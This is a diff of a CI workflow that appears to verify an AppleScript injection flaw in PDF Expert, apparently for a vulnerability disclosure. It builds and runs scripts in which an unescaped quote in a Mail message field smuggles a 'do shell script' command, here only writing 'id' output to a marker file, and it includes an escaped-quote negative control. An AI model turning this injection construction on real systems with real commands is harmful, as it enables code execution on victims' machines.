@@ -17,52 +17,58 @@ jobs:
         run: |
           set -euo pipefail
           curl -fsSL -o pex.zip https://downloads.pdfexpert.com/pem3/versions/1187/PDFExpert.zip
-          ls -l pex.zip
           shasum -a 256 pex.zip | tee zip.sha256
           unzip -q pex.zip -d app
-          BIN="app/PDF Expert.app/Contents/MacOS/PDF Expert"
-          ls -l "$BIN"
+          ls -l "app/PDF Expert.app/Contents/MacOS/PDF Expert"
 
       - name: Template literals present in the shipped bytes
         run: python3 poc/verify_binary.py "app/PDF Expert.app/Contents/MacOS/PDF Expert"
 
-      - name: Rebuild the script from the binary's own literals, then tokenize
+      - name: Build the script from the binary's own literals
         run: |
           set -euo pipefail
           python3 poc/gen_poc.py --binary "app/PDF Expert.app/Contents/MacOS/PDF Expert" \
             --cmd "id > /tmp/pdfe_pwned" --field body > generated.scpt
-          echo "--- generated ---"; cat generated.scpt
-          python3 poc/verify_tokenlevel.py generated.scpt
+          echo "--- wc ---"; wc -l generated.scpt
+          echo "--- numbered ---"; nl -ba generated.scpt
+          echo "--- tokenizer ---"; python3 poc/verify_tokenlevel.py generated.scpt
+          echo "--- compile check ---"
+          osacompile -o /tmp/gen.scpt generated.scpt && echo "COMPILE OK" || echo "COMPILE FAILED"
 
-      - name: Execute with the engine NSAppleScript drives
+      - name: DECISIVE - minimal script, same construction, same sink
         run: |
           set +e
-          rm -f /tmp/pdfe_pwned
-          osascript generated.scpt > osa.out 2>&1 &
+          rm -f /tmp/pdfe_mini
+          printf '%s\n' \
+            'tell application "Mail"' \
+            'set newMessage to make new outgoing message with properties {subject:"Invoice", content:"x" & do shell script "id > /tmp/pdfe_mini" & "" & linefeed & linefeed}' \
+            'end tell' > mini.scpt
+          nl -ba mini.scpt
+          osacompile -o /tmp/mini.scpt mini.scpt && echo "MINI COMPILE OK" || echo "MINI COMPILE FAILED"
+          osascript mini.scpt > mini.out 2>&1 &
           PID=$!
-          for i in $(seq 1 20); do [ -s /tmp/pdfe_pwned ] && break; sleep 1; done
+          for i in $(seq 1 20); do [ -s /tmp/pdfe_mini ] && break; sleep 1; done
           kill $PID 2>/dev/null
-          echo "--- osascript output ---"; cat osa.out
-          echo "--- marker ---"; cat /tmp/pdfe_pwned 2>/dev/null
-          if [ -s /tmp/pdfe_pwned ]; then echo "PROOF: do shell script executed"; else echo "NO PROOF"; fi
+          echo "--- mini output ---"; cat mini.out
+          echo "--- mini marker ---"; cat /tmp/pdfe_mini 2>/dev/null
+          if [ -s /tmp/pdfe_mini ]; then echo "MINI PROOF: do shell script executed"; else echo "MINI NO PROOF"; fi
 
-      - name: Negative control (escaped quote, expect no execution)
+      - name: NEGATIVE CONTROL - same line, quote escaped
         run: |
           set +e
           rm -f /tmp/pdfe_ctl
-          python3 - <<'PY' > ctl.scpt
-          q = lambda v: '"' + v.replace('"', '\\"') + '"'
-          print('tell application "Mail"')
-          print('set m to make new outgoing message with properties {subject:' + q('x" & do shell script "id > /tmp/pdfe_ctl" & "') + '}')
-          print('end tell')
-          PY
-          cat ctl.scpt
+          printf '%s\n' \
+            'tell application "Mail"' \
+            'set newMessage to make new outgoing message with properties {subject:"Invoice", content:"x\" & do shell script \"id > /tmp/pdfe_ctl\" & \"" & linefeed & linefeed}' \
+            'end tell' > ctl.scpt
+          nl -ba ctl.scpt
+          osacompile -o /tmp/ctl.scpt ctl.scpt && echo "CTL COMPILE OK" || echo "CTL COMPILE FAILED"
           osascript ctl.scpt > ctl.out 2>&1 &
           PID=$!
-          for i in $(seq 1 10); do [ -s /tmp/pdfe_ctl ] && break; sleep 1; done
+          for i in $(seq 1 15); do [ -s /tmp/pdfe_ctl ] && break; sleep 1; done
           kill $PID 2>/dev/null
-          echo "--- control output ---"; cat ctl.out
-          if [ -s /tmp/pdfe_ctl ]; then echo "CONTROL FAILED"; else echo "CONTROL OK: escaped payload did not execute"; fi
+          echo "--- ctl output ---"; cat ctl.out
+          if [ -s /tmp/pdfe_ctl ]; then echo "CONTROL FAILED: escaped payload executed"; else echo "CONTROL OK: escaped payload did not execute"; fi
 
       - name: Collect
         if: always()
@@ -71,10 +77,11 @@ jobs:
           name: evidence
           path: |
             generated.scpt
+            mini.scpt
             ctl.scpt
-            osa.out
+            mini.out
             ctl.out
             zip.sha256
-            /tmp/pdfe_pwned
+            /tmp/pdfe_mini
             /tmp/pdfe_ctl
           if-no-files-found: warn
